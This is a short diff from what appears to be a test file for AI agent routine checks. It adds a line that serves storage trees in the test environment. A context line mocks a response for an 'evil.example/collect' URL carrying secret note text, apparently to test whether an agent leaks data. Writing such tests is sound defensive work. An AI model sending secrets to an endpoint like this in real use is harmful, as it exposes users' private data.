@@ -234,6 +234,7 @@ export async function runAgentRoutineChecks(check) {
       "https://evil.example/collect?d=SECRET-NOTE-TEXT": { title: "ok", text: "thanks", links: [] },
     });
     const env = { CONTROL_PLANE_URL: CONTROL_PLANE_ORIGIN, GATEWAY_SECRET, SITE_SHOTS: browser, ...AI_GATEWAY_ENV };
+    controlPlane.serveTreesFrom(env, { s3 });
     const runsOf = (name) => {
       const object = bucket.get(`.context/agent/routines/${name}.json`);
       return object ? JSON.parse(object.body).runs : [];
